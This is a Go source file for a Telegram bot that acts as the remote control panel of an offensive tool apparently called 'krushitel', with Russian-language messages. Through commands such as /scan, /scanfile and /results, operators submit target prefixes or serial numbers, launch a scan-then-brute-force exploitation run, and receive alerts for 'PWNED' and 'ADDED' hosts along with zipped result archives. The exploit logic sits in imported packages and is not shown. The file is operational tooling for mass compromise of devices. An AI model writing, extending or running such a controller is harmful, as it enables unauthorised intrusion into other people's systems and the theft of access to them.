package tgbot

import (
	"archive/zip"
	"bytes"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"krushitel/core/exploit"
	"krushitel/core/fwd"
	"krushitel/core/scanner"
)

type Options struct {
	Ctx     context.Context
	Token   string
	ChatIDs []int64
	Threads int
	OutRoot string
	Opts    exploit.Opts
	Log     func(format string, args ...any)
}

const (
	statusEvery = 60 * time.Second
)

var helpText = strings.Join([]string{
	"krushitel tgbot — базовый контрол:",
	"/scan <цели> — брут по префиксам/серийникам (пробел или новые строки)",
	"/scanfile — пришли списком файлом вместе с командой",
	"/status — статус текущего скана",
	"/results — прислать архив с результатами последнего скана",
	"/stop — остановить текущий скан",
	"/help — это сообщение",
}, "\n")

type scanState struct {
	mu       sync.Mutex
	busy     bool
	cancel   context.CancelFunc
	outDir   string
	tp       *exploit.TwoPhaseStats
	events   chan string
	chat     int64
	started  time.Time
	statusID int64
}

type Bot struct {
	api    *API
	logFn  func(format string, args ...any)
	opts   Options
	st     scanState
	outMu  sync.Mutex
	outDir string
}

func Run(opts Options) error {
	b := &Bot{opts: opts, logFn: opts.Log}
	b.api = New(opts.Token, opts.ChatIDs)
	if opts.OutRoot == "" {
		opts.OutRoot = "."
	}
	if opts.Threads <= 0 {
		opts.Threads = 30
	}
	if len(opts.ChatIDs) == 0 {
		b.logf("[!] tg_chat_ids пуст — бот никого не слушает; пришли боту /start и впиши chat id в конфиг")
	}
	b.logf("tgbot: запущен, %d авторизованных чатов", len(opts.ChatIDs))

	for {
		if opts.Ctx != nil && opts.Ctx.Err() != nil {
			b.st.mu.Lock()
			if b.st.cancel != nil {
				b.st.cancel()
			}
			b.st.mu.Unlock()
			b.logf("tgbot: shutdown")
			return nil
		}
		upd, err := b.api.Poll()
		if err != nil {
			b.logf("[!] tgbot poll: %v", err)
			time.Sleep(3 * time.Second)
			continue
		}
		if upd == nil {
			continue
		}
		if !b.api.Allowed(upd.ChatID) {
			b.logf("[!] tgbot: чужой chat_id %d (user %d) — добавь в tg_chat_ids", upd.ChatID, upd.UserID)
			continue
		}
		b.handle(upd)
	}
}

func (b *Bot) logf(format string, args ...any) {
	if b.logFn != nil {
		b.logFn(format, args...)
	}
}

func (b *Bot) handle(u *Update) {
	cmd := u.Text
	args := ""
	if i := strings.IndexAny(cmd, " \n"); i >= 0 {
		cmd, args = cmd[:i], strings.TrimSpace(cmd[i+1:])
	}
	switch cmd {
	case "/start", "/help":
		b.api.Send(u.ChatID, helpText)
	case "/scan":
		b.startScan(u, args, "")
	case "/scanfile":
		b.startScan(u, args, u.DocID)
	case "/status":
		b.api.Send(u.ChatID, b.status())
	case "/stop":
		b.stopScan(u)
	case "/results":
		b.sendResults(u)
	default:
		b.api.Send(u.ChatID, helpText)
	}
}

func (b *Bot) startScan(u *Update, args, docID string) {
	b.st.mu.Lock()
	if b.st.busy {
		b.st.mu.Unlock()
		b.api.Send(u.ChatID, "[!] скан уже идёт — /stop или /status")
		return
	}
	b.st.busy = true
	b.st.chat = u.ChatID
	b.st.mu.Unlock()

	go b.runScan(u.ChatID, args, docID)
}

func (b *Bot) runScan(chat int64, args, docID string) {
	defer func() {
		b.st.mu.Lock()
		b.st.busy = false
		b.st.mu.Unlock()
	}()

	var inFile string
	if docID != "" {
		data, err := b.api.Download(docID)
		if err != nil {
			b.api.Send(chat, "[!] файл не скачался: "+err.Error())
			return
		}
		f, err := os.CreateTemp("", "tgscan_*.txt")
		if err != nil {
			b.api.Send(chat, "[!] temp: "+err.Error())
			return
		}
		if _, err := f.Write(data); err != nil {
			f.Close()
			b.api.Send(chat, "[!] temp: "+err.Error())
			return
		}
		f.Close()
		inFile = f.Name()
		defer os.Remove(inFile)
	} else if args == "" {
		b.api.Send(chat, "[!] пусто: /scan <цели> или /scanfile с файлом")
		return
	} else {
		inFile = strings.ReplaceAll(args, "\n", " ")
	}

	prefixes, direct, lerr := exploit.LoadTargetInput(inFile)
	if lerr != nil {
		b.api.Send(chat, "[!] "+lerr.Error())
		return
	}

	outDir := filepath.Join(b.opts.OutRoot, "tg_"+time.Now().Format("20060102_150405"))
	if err := os.MkdirAll(outDir, 0755); err != nil {
		b.api.Send(chat, "[!] папка: "+err.Error())
		return
	}
	b.outMu.Lock()
	b.outDir = outDir
	b.outMu.Unlock()

	scanTotal := int64(len(prefixes)) * scanner.SuffixCombos
	head := fmt.Sprintf("старт: %d префиксов (%d серийников), %d прямых SN\nрезультаты: %s",
		len(prefixes), scanTotal, len(direct), outDir)
	b.api.Send(chat, head)

	fwd.InitLimit = 100
	ctx, cancel := context.WithCancel(context.Background())
	tp := &exploit.TwoPhaseStats{
		Scan:        &scanner.ScanStats{},
		Exp:         &exploit.Stats{},
		PrefixCount: len(prefixes),
		DirectCount: len(direct),
		ScanTotal:   scanTotal,
	}
	events := make(chan string, 1024)

	b.st.mu.Lock()
	b.st.cancel = cancel
	b.st.outDir = outDir
	b.st.tp = tp
	b.st.events = events
	b.st.started = time.Now()
	b.st.mu.Unlock()

	doneEvents := make(chan struct{})
	go func() {
		for line := range events {
			b.logf("%s", line)
			if strings.Contains(line, "PWNED") || strings.Contains(line, "ADDED") {
				b.api.Send(chat, line)
			}
		}
		close(doneEvents)
	}()

	b.st.mu.Lock()
	b.st.statusID = b.api.SendMsg(chat, b.summary())
	b.st.mu.Unlock()

	ticker := time.NewTicker(statusEvery)
	tickerStop := make(chan struct{})
	go func() {
		defer ticker.Stop()
		for {
			select {
			case <-tickerStop:
				return
			case <-ticker.C:
				b.updateStatus()
			}
		}
	}()

	exploit.RunPrefixExploit(ctx, prefixes, direct, outDir, b.opts.Threads, b.opts.Opts, tp, events)
	cancel()

	close(events)
	<-doneEvents
	close(tickerStop)

	final := "финиш: " + b.summary()
	if msg := tp.Scan.ErrorMsg; msg != "" {
		final += "\n[!] scan: " + msg
	}
	if msg := tp.Exp.ErrorMsg; msg != "" {
		final += "\n[!] " + msg
	}
	if ctx.Err() != nil {
		final += "\n(остановлено командой /stop — session-маркер сохранён)"
	}
	b.st.mu.Lock()
	sid := b.st.statusID
	b.st.statusID = 0
	b.st.mu.Unlock()
	if sid != 0 {
		b.api.Edit(chat, sid, final)
	} else {
		b.api.Send(chat, final)
	}
}

func (b *Bot) stopScan(u *Update) {
	b.st.mu.Lock()
	defer b.st.mu.Unlock()
	if !b.st.busy || b.st.cancel == nil {
		b.api.Send(u.ChatID, "[!] скана нет")
		return
	}
	b.st.cancel()
	b.api.Send(u.ChatID, "стопаю...")
}

func (b *Bot) status() string {
	b.st.mu.Lock()
	defer b.st.mu.Unlock()
	if !b.st.busy {
		return "сканов нет — /scan <цели>"
	}
	return b.summary()
}

func (b *Bot) updateStatus() {
	b.st.mu.Lock()
	defer b.st.mu.Unlock()
	if !b.st.busy {
		return
	}
	s := b.summary()
	if s == "" {
		return
	}
	if b.st.statusID != 0 {
		b.api.Edit(b.st.chat, b.st.statusID, s)
	} else {
		b.st.statusID = b.api.SendMsg(b.st.chat, s)
	}
}

func (b *Bot) summary() string {
	tp := b.st.tp
	if tp == nil {
		return ""
	}
	elapsed := time.Since(b.st.started).Truncate(time.Second)
	if atomic.LoadInt32(&tp.Phase) == 1 {
		return fmt.Sprintf("[1/2] скан: %d/%d префиксов · found: %d · %s",
			atomic.LoadInt64(&tp.Scan.PrefixDone), tp.PrefixCount, tp.FoundCount(), elapsed)
	}
	return fmt.Sprintf("[2/2] брут: %d/%d · pwned: %d · added: %d · %s",
		tp.Exp.Processed, tp.Exp.Total, tp.Exp.Pwned, tp.Exp.Added, elapsed)
}

func (b *Bot) sendResults(u *Update) {
	b.outMu.Lock()
	outDir := b.outDir
	b.outMu.Unlock()
	if outDir == "" {
		b.api.Send(u.ChatID, "[!] сканов ещё не было")
		return
	}
	b.api.Send(u.ChatID, "зипую...")
	data, err := zipDir(outDir)
	if err != nil {
		if err == ErrTooBig {
			if csv, cerr := os.ReadFile(filepath.Join(outDir, exploit.ResultsFile)); cerr == nil {
				if serr := b.api.SendDocument(u.ChatID, exploit.ResultsFile, csv); serr == nil {
					return
				}
			}
			b.api.Send(u.ChatID, "[!] папка больше 45MB — забирай с диска: "+outDir)
			return
		}
		b.api.Send(u.ChatID, "[!] zip: "+err.Error())
		return
	}
	name := filepath.Base(outDir) + ".zip"
	if err := b.api.SendDocument(u.ChatID, name, data); err != nil {
		b.api.Send(u.ChatID, "[!] отправка: "+err.Error())
	}
}

func zipDir(root string) ([]byte, error) {
	var buf bytes.Buffer
	total := int64(0)
	zw := zip.NewWriter(&buf)
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return err
		}
		if total+info.Size() > maxFileSize {
			return ErrTooBig
		}
		rel, rerr := filepath.Rel(root, path)
		if rerr != nil {
			return rerr
		}
		fw, ferr := zw.Create(rel)
		if ferr != nil {
			return ferr
		}
		data, rerr := os.ReadFile(path)
		if rerr != nil {
			return rerr
		}
		_, werr := fw.Write(data)
		total += info.Size()
		return werr
	})
	if err != nil {
		return nil, err
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
